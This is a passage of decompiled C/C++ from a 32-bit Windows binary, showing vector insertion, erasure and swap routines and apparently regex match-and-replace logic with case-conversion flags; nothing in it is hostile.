  FUN_00403358(this,*(undefined4 **)((int)this + 8),(undefined4 *)0x1,param_1);
  return;
}



void __thiscall FUN_00403057(void *this,undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *puVar8;
  uint uVar9;
  undefined4 *puVar10;
  undefined4 *puVar11;
  undefined4 *local_8;
  
  uVar1 = ((int)param_3 - (int)param_2) / 0x1a;
  puVar6 = *(undefined4 **)((int)this + 8);
  if ((uint)((*(int *)((int)this + 0xc) - (int)puVar6) / 0x1a) < uVar1) {
    uVar9 = uVar1;
    if ((*(int *)((int)this + 4) != 0) &&
       (uVar2 = ((int)puVar6 - *(int *)((int)this + 4)) / 0x1a, uVar1 < uVar2)) {
      uVar9 = uVar2;
    }
    if (*(int *)((int)this + 4) == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = ((int)puVar6 - *(int *)((int)this + 4)) / 0x1a;
    }
    iVar3 = uVar9 + iVar3;
    iVar4 = iVar3;
    if (iVar3 < 0) {
      iVar4 = 0;
    }
    puVar5 = (undefined4 *)operator_new(iVar4 * 0x1a);
    local_8 = puVar5;
    for (puVar6 = *(undefined4 **)((int)this + 4); puVar6 != param_1;
        puVar6 = (undefined4 *)((int)puVar6 + 0x1a)) {
      if (local_8 != (undefined4 *)0x0) {
        puVar8 = puVar6;
        puVar10 = local_8;
        for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar10 = *puVar8;
          puVar8 = puVar8 + 1;
          puVar10 = puVar10 + 1;
        }
        *(undefined2 *)puVar10 = *(undefined2 *)puVar8;
      }
      local_8 = (undefined4 *)((int)local_8 + 0x1a);
    }
    if (param_2 != param_3) {
      iVar4 = (int)param_2 - (int)local_8;
      do {
        if (local_8 != (undefined4 *)0x0) {
          puVar6 = (undefined4 *)(iVar4 + (int)local_8);
          puVar8 = local_8;
          for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
            *puVar8 = *puVar6;
            puVar6 = puVar6 + 1;
            puVar8 = puVar8 + 1;
          }
          *(undefined2 *)puVar8 = *(undefined2 *)puVar6;
        }
        local_8 = (undefined4 *)((int)local_8 + 0x1a);
      } while ((undefined4 *)(iVar4 + (int)local_8) != param_3);
    }
    puVar6 = *(undefined4 **)((int)this + 8);
    if (param_1 != puVar6) {
      iVar4 = (int)param_1 - (int)local_8;
      do {
        if (local_8 != (undefined4 *)0x0) {
          puVar8 = (undefined4 *)(iVar4 + (int)local_8);
          puVar10 = local_8;
          for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
            *puVar10 = *puVar8;
            puVar8 = puVar8 + 1;
            puVar10 = puVar10 + 1;
          }
          *(undefined2 *)puVar10 = *(undefined2 *)puVar8;
        }
        local_8 = (undefined4 *)((int)local_8 + 0x1a);
      } while ((undefined4 *)(iVar4 + (int)local_8) != puVar6);
    }
    operator_delete(*(void **)((int)this + 4));
    *(undefined2 **)((int)this + 0xc) = (undefined2 *)(iVar3 * 0x1a + (int)puVar5);
    if (*(int *)((int)this + 4) == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = (*(int *)((int)this + 8) - *(int *)((int)this + 4)) / 0x1a;
    }
    *(undefined4 **)((int)this + 4) = puVar5;
    *(undefined2 **)((int)this + 8) = (undefined2 *)((iVar3 + uVar1) * 0x1a + (int)puVar5);
  }
  else if ((uint)(((int)puVar6 - (int)param_1) / 0x1a) < uVar1) {
    puVar5 = (undefined4 *)(uVar1 * 0x1a + (int)param_1);
    if (param_1 != puVar6) {
      puVar8 = (undefined4 *)((int)puVar5 + uVar1 * -0x1a);
      do {
        if (puVar5 != (undefined4 *)0x0) {
          puVar10 = puVar8;
          puVar11 = puVar5;
          for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
            *puVar11 = *puVar10;
            puVar10 = puVar10 + 1;
            puVar11 = puVar11 + 1;
          }
          *(undefined2 *)puVar11 = *(undefined2 *)puVar10;
        }
        puVar8 = (undefined4 *)((int)puVar8 + 0x1a);
        puVar5 = (undefined4 *)((int)puVar5 + 0x1a);
      } while (puVar8 != puVar6);
    }
    puVar6 = *(undefined4 **)((int)this + 8);
    for (puVar5 = (undefined4 *)((((int)puVar6 - (int)param_1) / 0x1a) * 0x1a + (int)param_2);
        puVar5 != param_3; puVar5 = (undefined4 *)((int)puVar5 + 0x1a)) {
      if (puVar6 != (undefined4 *)0x0) {
        puVar8 = puVar5;
        puVar10 = puVar6;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar10 = *puVar8;
          puVar8 = puVar8 + 1;
          puVar10 = puVar10 + 1;
        }
        *(undefined2 *)puVar10 = *(undefined2 *)puVar8;
      }
      puVar6 = (undefined4 *)((int)puVar6 + 0x1a);
    }
    puVar6 = (undefined4 *)(((*(int *)((int)this + 8) - (int)param_1) / 0x1a) * 0x1a + (int)param_2)
    ;
    if (param_2 != puVar6) {
      iVar3 = (int)param_1 - (int)param_2;
      do {
        puVar5 = param_2;
        puVar8 = (undefined4 *)(iVar3 + (int)param_2);
        for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar8 = *puVar5;
          puVar5 = puVar5 + 1;
          puVar8 = puVar8 + 1;
        }
        param_2 = (undefined4 *)((int)param_2 + 0x1a);
        *(undefined2 *)puVar8 = *(undefined2 *)puVar5;
      } while (param_2 != puVar6);
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + uVar1 * 0x1a;
  }
  else if (uVar1 != 0) {
    local_8 = puVar6;
    for (puVar5 = (undefined4 *)((int)puVar6 + uVar1 * -0x1a); puVar5 != puVar6;
        puVar5 = (undefined4 *)((int)puVar5 + 0x1a)) {
      if (local_8 != (undefined4 *)0x0) {
        puVar8 = puVar5;
        puVar10 = local_8;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar10 = *puVar8;
          puVar8 = puVar8 + 1;
          puVar10 = puVar10 + 1;
        }
        *(undefined2 *)puVar10 = *(undefined2 *)puVar8;
      }
      local_8 = (undefined4 *)((int)local_8 + 0x1a);
    }
    puVar6 = *(undefined4 **)((int)this + 8);
    puVar5 = (undefined4 *)((int)puVar6 + uVar1 * -0x1a);
    while (param_1 != puVar5) {
      puVar6 = (undefined4 *)((int)puVar6 + -0x1a);
      puVar5 = (undefined4 *)((int)puVar5 + -0x1a);
      puVar8 = puVar5;
      puVar10 = puVar6;
      for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar10 = *puVar8;
        puVar8 = puVar8 + 1;
        puVar10 = puVar10 + 1;
      }
      *(undefined2 *)puVar10 = *(undefined2 *)puVar8;
    }
    if (param_2 != param_3) {
      iVar3 = (int)param_1 - (int)param_2;
      do {
        puVar6 = param_2;
        puVar5 = (undefined4 *)(iVar3 + (int)param_2);
        for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar5 = *puVar6;
          puVar6 = puVar6 + 1;
          puVar5 = puVar5 + 1;
        }
        param_2 = (undefined4 *)((int)param_2 + 0x1a);
        *(undefined2 *)puVar5 = *(undefined2 *)puVar6;
      } while (param_2 != param_3);
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + uVar1 * 0x1a;
  }
  return;
}



void __fastcall FUN_004032dc(void *param_1)

{
  FUN_00403315(param_1,*(undefined4 **)((int)param_1 + 4),*(undefined4 **)((int)param_1 + 8));
  return;
}



void __thiscall FUN_004032e8(void *this,int param_1)

{
  undefined4 uVar1;
  
  uVar1 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  *(undefined4 *)(param_1 + 4) = uVar1;
  uVar1 = *(undefined4 *)((int)this + 8);
  *(undefined4 *)((int)this + 8) = *(undefined4 *)(param_1 + 8);
  *(undefined4 *)(param_1 + 8) = uVar1;
  uVar1 = *(undefined4 *)((int)this + 0xc);
  *(undefined4 *)((int)this + 0xc) = *(undefined4 *)(param_1 + 0xc);
  *(undefined4 *)(param_1 + 0xc) = uVar1;
  return;
}



undefined4 * __thiscall FUN_00403315(void *this,undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
  puVar1 = *(undefined4 **)((int)this + 8);
  puVar3 = param_1;
  if (param_2 != puVar1) {
    do {
      puVar4 = param_2;
      puVar5 = puVar3;
      for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar5 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar5 = puVar5 + 1;
      }
      param_2 = (undefined4 *)((int)param_2 + 0x1a);
      puVar3 = (undefined4 *)((int)puVar3 + 0x1a);
      *(undefined2 *)puVar5 = *(undefined2 *)puVar4;
    } while (param_2 != puVar1);
  }
  *(undefined4 **)((int)this + 8) = puVar3;
  return param_1;
}



void __thiscall FUN_00403358(void *this,undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *local_8;
  
  puVar1 = param_2;
  puVar4 = *(undefined4 **)((int)this + 8);
  if ((undefined4 *)((*(int *)((int)this + 0xc) - (int)puVar4) / 0x1a) < param_2) {
    if ((*(int *)((int)this + 4) == 0) ||
       (puVar1 = (undefined4 *)(((int)puVar4 - *(int *)((int)this + 4)) / 0x1a), puVar1 <= param_2))
    {
      puVar1 = param_2;
    }
    if (*(int *)((int)this + 4) == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = ((int)puVar4 - *(int *)((int)this + 4)) / 0x1a;
    }
    iVar2 = (int)puVar1 + iVar2;
    iVar3 = iVar2;
    if (iVar2 < 0) {
      iVar3 = 0;
    }
    puVar1 = (undefined4 *)operator_new(iVar3 * 0x1a);
    local_8 = puVar1;
    for (puVar4 = *(undefined4 **)((int)this + 4); puVar4 != param_1;
        puVar4 = (undefined4 *)((int)puVar4 + 0x1a)) {
      if (local_8 != (undefined4 *)0x0) {
        puVar5 = puVar4;
        puVar6 = local_8;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar6 = *puVar5;
          puVar5 = puVar5 + 1;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)puVar6 = *(undefined2 *)puVar5;
      }
      local_8 = (undefined4 *)((int)local_8 + 0x1a);
    }
    puVar4 = local_8;
    puVar5 = param_2;
    if (param_2 != (undefined4 *)0x0) {
      do {
        if (puVar4 != (undefined4 *)0x0) {
          puVar6 = param_3;
          puVar7 = puVar4;
          for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
            *puVar7 = *puVar6;
            puVar6 = puVar6 + 1;
            puVar7 = puVar7 + 1;
          }
          *(undefined2 *)puVar7 = *(undefined2 *)puVar6;
        }
        puVar5 = (undefined4 *)((int)puVar5 + -1);
        puVar4 = (undefined4 *)((int)puVar4 + 0x1a);
      } while (puVar5 != (undefined4 *)0x0);
    }
    param_3 = (undefined4 *)((int)local_8 + (int)param_2 * 0x1a);
    puVar4 = *(undefined4 **)((int)this + 8);
    if (param_1 != puVar4) {
      puVar5 = (undefined4 *)((int)param_3 + ((int)param_2 * -0x1a - (int)local_8) + (int)param_1);
      do {
        if (param_3 != (undefined4 *)0x0) {
          puVar6 = puVar5;
          puVar7 = param_3;
          for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
            *puVar7 = *puVar6;
            puVar6 = puVar6 + 1;
            puVar7 = puVar7 + 1;
          }
          *(undefined2 *)puVar7 = *(undefined2 *)puVar6;
        }
        param_3 = (undefined4 *)((int)param_3 + 0x1a);
        puVar5 = (undefined4 *)((int)puVar5 + 0x1a);
      } while (puVar5 != puVar4);
    }
    operator_delete(*(void **)((int)this + 4));
    *(undefined2 **)((int)this + 0xc) = (undefined2 *)(iVar2 * 0x1a + (int)puVar1);
    if (*(int *)((int)this + 4) == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = (*(int *)((int)this + 8) - *(int *)((int)this + 4)) / 0x1a;
    }
    *(undefined4 **)((int)this + 4) = puVar1;
    *(undefined2 **)((int)this + 8) = (undefined2 *)((iVar2 + (int)param_2) * 0x1a + (int)puVar1);
  }
  else if ((undefined4 *)(((int)puVar4 - (int)param_1) / 0x1a) < param_2) {
    puVar1 = (undefined4 *)((int)param_2 * 0x1a + (int)param_1);
    if (param_1 != puVar4) {
      puVar5 = (undefined4 *)((int)puVar1 + (int)param_2 * -0x1a);
      do {
        if (puVar1 != (undefined4 *)0x0) {
          puVar6 = puVar5;
          puVar7 = puVar1;
          for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {
            *puVar7 = *puVar6;
            puVar6 = puVar6 + 1;
            puVar7 = puVar7 + 1;
          }
          *(undefined2 *)puVar7 = *(undefined2 *)puVar6;
        }
        puVar5 = (undefined4 *)((int)puVar5 + 0x1a);
        puVar1 = (undefined4 *)((int)puVar1 + 0x1a);
      } while (puVar5 != puVar4);
    }
    puVar4 = *(undefined4 **)((int)this + 8);
    for (iVar2 = (int)param_2 - ((int)puVar4 - (int)param_1) / 0x1a; iVar2 != 0; iVar2 = iVar2 + -1)
    {
      if (puVar4 != (undefined4 *)0x0) {
        puVar1 = param_3;
        puVar5 = puVar4;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar5 = *puVar1;
          puVar1 = puVar1 + 1;
          puVar5 = puVar5 + 1;
        }
        *(undefined2 *)puVar5 = *(undefined2 *)puVar1;
      }
      puVar4 = (undefined4 *)((int)puVar4 + 0x1a);
    }
    puVar4 = *(undefined4 **)((int)this + 8);
    for (; param_1 != puVar4; param_1 = (undefined4 *)((int)param_1 + 0x1a)) {
      puVar1 = param_3;
      puVar5 = param_1;
      for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar5 = *puVar1;
        puVar1 = puVar1 + 1;
        puVar5 = puVar5 + 1;
      }
      *(undefined2 *)puVar5 = *(undefined2 *)puVar1;
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + (int)param_2 * 0x1a;
  }
  else if (param_2 != (undefined4 *)0x0) {
    iVar2 = (int)param_2 * 0x1a;
    puVar5 = (undefined4 *)((int)puVar4 + (int)param_2 * -0x1a);
    param_2 = puVar4;
    for (; puVar5 != puVar4; puVar5 = (undefined4 *)((int)puVar5 + 0x1a)) {
      if (param_2 != (undefined4 *)0x0) {
        puVar6 = puVar5;
        puVar7 = param_2;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar7 = *puVar6;
          puVar6 = puVar6 + 1;
          puVar7 = puVar7 + 1;
        }
        *(undefined2 *)puVar7 = *(undefined2 *)puVar6;
      }
      param_2 = (undefined4 *)((int)param_2 + 0x1a);
    }
    puVar4 = *(undefined4 **)((int)this + 8);
    puVar1 = (undefined4 *)((int)puVar4 + (int)puVar1 * -0x1a);
    while (param_1 != puVar1) {
      puVar4 = (undefined4 *)((int)puVar4 + -0x1a);
      puVar1 = (undefined4 *)((int)puVar1 + -0x1a);
      puVar5 = puVar1;
      puVar6 = puVar4;
      for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
      }
      *(undefined2 *)puVar6 = *(undefined2 *)puVar5;
    }
    puVar4 = (undefined4 *)(iVar2 + (int)param_1);
    if (param_1 != puVar4) {
      do {
        puVar1 = (undefined4 *)((int)param_1 + 0x1a);
        puVar5 = param_3;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *param_1 = *puVar5;
          puVar5 = puVar5 + 1;
          param_1 = param_1 + 1;
        }
        *(undefined2 *)param_1 = *(undefined2 *)puVar5;
        param_1 = puVar1;
      } while (puVar1 != puVar4);
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + iVar2;
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined __cdecl FUN_004035be(int param_1,int param_2,int param_3,undefined4 param_4,char param_5)

{
  undefined *this;
  byte bVar1;
  int *piVar2;
  char cVar3;
  int iVar4;
  undefined uVar5;
  int *local_48;
  undefined4 local_44;
  int local_40;
  undefined4 local_3c;
  undefined4 local_38;
  int local_34;
  int local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined local_24;
  undefined local_23;
  undefined local_20 [4];
  undefined4 local_1c;
  undefined4 *local_18;
  undefined4 local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004158f0;
  local_10 = ExceptionList;
  local_44 = param_4;
  local_40 = param_3;
  ExceptionList = &local_10;
  *(int *)(param_2 + 0x14) = param_3;
  local_34 = param_3;
  local_30 = param_3;
  local_48 = (int *)0x0;
  local_3c = 0;
  local_38 = 0;
  local_2c = 0;
  local_28 = 0;
  local_24 = false;
  local_23 = 0;
  if ((*(uint *)(param_1 + 0x13) & 2) == 0) {
    uVar5 = FUN_004036f8(param_1,&local_48,(void *)(param_2 + 4),param_5);
  }
  else {
    bVar1 = (byte)*(uint *)(param_1 + 0x13);
    this = (undefined *)(param_2 + 4);
    local_1c = 0;
    local_18 = (undefined4 *)0x0;
    local_20[0] = *this;
    local_14 = 0;
    local_8 = 0;
    while( true ) {
      cVar3 = FUN_004036f8(param_1,&local_48,this,param_5);
      piVar2 = local_48;
      if (cVar3 == '\0') break;
      if ((bVar1 & 0x40) == 0x40) {
        FUN_00403046(local_20,local_48);
      }
      else if ((bVar1 & 0x80) == 0x80) {
        FUN_00403057(local_20,local_18,*(undefined4 **)(param_2 + 8),*(undefined4 **)(param_2 + 0xc)
                    );
      }
      else {
        FUN_004032e8(local_20,(int)this);
      }
      local_30 = piVar2[1];
      local_24 = *piVar2 == piVar2[1];
    }
    FUN_004032e8(this,(int)local_20);
    if (*(int *)(param_2 + 8) == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = (*(int *)(param_2 + 0xc) - *(int *)(param_2 + 8)) / 0x1a;
    }
    FUN_00402249((int)local_20);
    uVar5 = iVar4 != 0;
  }
  ExceptionList = local_10;
  return uVar5;
}



undefined __cdecl FUN_004036f8(int param_1,undefined4 *param_2,void *param_3,char param_4)

{
  undefined uVar1;
  int iVar2;
  uint uVar3;
  undefined4 local_40;
  undefined4 local_3c;
  undefined local_38;
  undefined4 local_37;
  undefined4 local_33;
  undefined local_2f;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined local_20;
  undefined *local_1c;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  undefined4 uVar4;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_00417678;
  puStack_10 = &DAT_00415404;
  local_14 = ExceptionList;
  local_1c = &stack0xffffff7c;
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_37 = 0;
  local_33 = 0;
  local_2f = 0;
  local_2e = DAT_00417674;
  local_2a = DAT_00417674;
  ExceptionList = &local_14;
  FUN_00403dbb(param_3,*(uint *)(param_1 + 0xb),&local_40);
  *param_2 = *(undefined4 *)((int)param_3 + 4);
  if (*(int *)((int)param_3 + 4) == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = (*(int *)((int)param_3 + 8) - *(int *)((int)param_3 + 4)) / 0x1a;
  }
  param_2[3] = iVar2;
  local_8 = 0;
  uVar3 = FUN_00404492(param_1);
  if ((char)uVar3 == '\0') {
    uVar3 = FUN_00406a77(param_1,(undefined *)param_2,param_4);
    uVar1 = (undefined)uVar3;
  }
  else {
    uVar4 = FUN_0040690d(param_1,(undefined *)param_2,param_4);
    uVar1 = (undefined)uVar4;
  }
  local_8 = 0xffffffff;
  local_20 = uVar1;
  FUN_00404231(param_3,param_1 + 0x43);
  ExceptionList = local_14;
  return uVar1;
}



// WARNING: Type propagation algorithm not settling

int __cdecl
FUN_00403810(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            void *param_2,int param_3,uint param_4,uint param_5)

{
  int iVar1;
  uint uVar2;
  bool bVar3;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this;
  uint uVar4;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> bVar5;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar6;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar7;
  int iVar8;
  int iVar9;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar10;
  int iVar11;
  char *pcVar12;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar13;
  int *piVar14;
  char *pcVar15;
  int local_10;
  int local_c;
  
  uVar4 = param_4;
  this = param_1;
  local_10 = 0;
  local_c = 0;
  bVar3 = true;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
            (param_1);
  pbVar6 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
           (param_5 + param_4 + *(int *)(param_1 + 4));
  iVar1 = *(int *)(param_3 + 0x2f);
  piVar14 = (int *)**(int **)(param_3 + 0x37);
  pbVar13 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)param_4;
  if (*(int **)(param_3 + 0x37) != piVar14) {
    do {
      param_1 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (this);
      iVar11 = piVar14[2];
      pbVar7 = pbVar13 + *(int *)(this + 4);
      pbVar10 = pbVar7;
      if (iVar11 == 0) {
        pcVar12 = (char *)(piVar14[3] + *(int *)(iVar1 + 4));
        pcVar15 = pcVar12 + piVar14[4];
        if (bVar3) {
          pbVar10 = pbVar6;
        }
LAB_0040397a:
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::replace
                  (this,(char *)pbVar7,(char *)pbVar10,pcVar12,pcVar15);
        param_1 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                  (pcVar15 + -(int)pcVar12);
        pbVar13 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                  param_4;
LAB_0040398d:
        bVar3 = false;
        if (local_c != 0) {
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (this);
          pbVar10 = pbVar13 + *(int *)(this + 4);
          pbVar7 = param_1 + (int)pbVar10;
          if (local_c == -1) {
            for (; pbVar7 != pbVar10; pbVar10 = pbVar10 + 1) {
              iVar11 = toupper((int)(char)*pbVar10);
              *pbVar10 = SUB41(iVar11,0);
            }
          }
          else if (local_c == 1) {
            for (; pbVar7 != pbVar10; pbVar10 = pbVar10 + 1) {
              iVar11 = tolower((int)(char)*pbVar10);
              *pbVar10 = SUB41(iVar11,0);
            }
          }
        }
        if (local_10 != 0) {
          if (local_10 == -1) {
            pbVar10 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       *)_C_exref;
            if ((pbVar13 <=
                 *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  (this + 8)) && (*(int *)(this + 4) != 0)) {
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(this);
              pbVar10 = pbVar13 + *(int *)(this + 4);
            }
            iVar11 = toupper((int)(char)*pbVar10);
            bVar5 = SUB41(iVar11,0);
            pbVar10 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       *)_C_exref;
            if ((pbVar13 <=
                 *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  (this + 8)) && (*(int *)(this + 4) != 0)) {
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(this);
              pbVar10 = pbVar13 + *(int *)(this + 4);
            }
LAB_00403ab9:
            *pbVar10 = bVar5;
          }
          else if (local_10 == 1) {
            pbVar10 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       *)_C_exref;
            if ((pbVar13 <=
                 *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  (this + 8)) && (*(int *)(this + 4) != 0)) {
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(this);
              pbVar10 = pbVar13 + *(int *)(this + 4);
            }
            iVar11 = tolower((int)(char)*pbVar10);
            bVar5 = SUB41(iVar11,0);
            pbVar10 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       *)_C_exref;
            if ((pbVar13 <=
                 *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  (this + 8)) && (*(int *)(this + 4) != 0)) {
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(this);
              pbVar10 = pbVar13 + *(int *)(this + 4);
            }
            goto LAB_00403ab9;
          }
          local_10 = 0;
        }
        pbVar13 = pbVar13 + (int)param_1;
        param_4 = (uint)pbVar13;
      }
      else {
        if (iVar11 == 1) {
          uVar2 = piVar14[3];
          if (uVar2 == 0xfffffffe) {
            iVar11 = *(int *)(*(int *)((int)param_2 + 0x28) + 4);
            iVar8 = FUN_00403d94(param_2,0);
            iVar9 = FUN_00403d7c(param_2,0);
            pcVar12 = (char *)(iVar8 + iVar9 + iVar11);
            iVar11 = *(int *)(*(int *)((int)param_2 + 0x28) + 4);
            pcVar15 = (char *)(-(uint)(iVar11 != 0) &
                              *(int *)(*(int *)((int)param_2 + 0x28) + 8) + iVar11);
          }
          else {
            if (uVar2 == 0xffffffff) {
              pcVar12 = *(char **)(*(int *)((int)param_2 + 0x28) + 4);
              iVar11 = FUN_00403d7c(param_2,0);
            }
            else {
              iVar11 = *(int *)(*(int *)((int)param_2 + 0x28) + 4);
              iVar8 = FUN_00403d7c(param_2,uVar2);
              pcVar12 = (char *)(iVar11 + iVar8);
              iVar11 = FUN_00403d94(param_2,piVar14[3]);
            }
            pcVar15 = pcVar12 + iVar11;
          }
          if (bVar3) {
            pbVar10 = pbVar6;
          }
          goto LAB_0040397a;
        }
        if (iVar11 != 2) goto LAB_0040398d;
        iVar11 = piVar14[3];
        if (iVar11 == 0x28) {
          local_c = -1;
        }
        else if (iVar11 == 0x29) {
          local_10 = -1;
        }
        else if (iVar11 == 0x2a) {
          local_c = 1;
        }
        else if (iVar11 == 0x2b) {
          local_10 = 1;
        }
        else if (iVar11 == 0x2c) {
          local_c = 0;
        }
      }
      piVar14 = (int *)*piVar14;
    } while ((int *)*(int *)(param_3 + 0x37) != piVar14);
    if (!bVar3) goto LAB_00403ae8;
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
            (this,(uint)pbVar13,param_5);
LAB_00403ae8:
  return (int)pbVar13 - uVar4;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int __cdecl
FUN_00403af2(int param_1,void *param_2,char *param_3,char *param_4,int param_5,char param_6)

{
  char **ppcVar1;
  char *pcVar2;
  char *pcVar3;
  void *this;
  char cVar4;
  size_t sVar5;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar6;
  int iVar7;
  bool bVar8;
  char **local_6c;
  char *local_68;
  char *local_64;
  undefined4 local_60;
  undefined4 local_5c;
  char *local_58;
  char *local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined local_48;
  undefined local_47;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_44 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_34 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [4];
  int local_20;
  int local_1c;
  undefined4 local_18;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_11;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  this = param_2;
  puStack_c = &LAB_00415928;
  local_10 = ExceptionList;
  local_24[0] = param_5._3_1_;
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  local_11 = param_5._3_1_;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_00403f7f(param_2,*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                         **)((int)param_2 + 4),
               *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)param_2 + 8));
  FUN_00403e27(param_2,10);
  local_68 = param_4;
  local_6c = (char **)0x0;
  local_64 = param_3;
  local_60 = 0;
  local_5c = 0;
  local_58 = param_3;
  local_54 = param_3;
  local_50 = 0;
  local_4c = 0;
  local_48 = 0;
  local_47 = 0;
  if (param_5 != 1) {
    do {
      cVar4 = FUN_004036f8(param_1,&local_6c,local_24,param_6);
      pcVar3 = local_54;
      if (cVar4 == '\0') break;
      ppcVar1 = local_6c + 1;
      local_48 = *local_6c == *ppcVar1;
      if ((bool)local_48) {
        if (*local_6c != local_58) {
          if (param_6 == '\0') {
            bVar8 = local_54 == local_68;
          }
          else {
            bVar8 = *local_54 == '\0';
          }
          if (!bVar8) goto LAB_00403bc8;
          break;
        }
      }
      else {
LAB_00403bc8:
        pcVar2 = *local_6c;
        local_44[0] = local_11;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                  (local_44,false);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                  (local_44,pcVar3,pcVar2);
        local_8 = CONCAT31(local_8._1_3_,1);
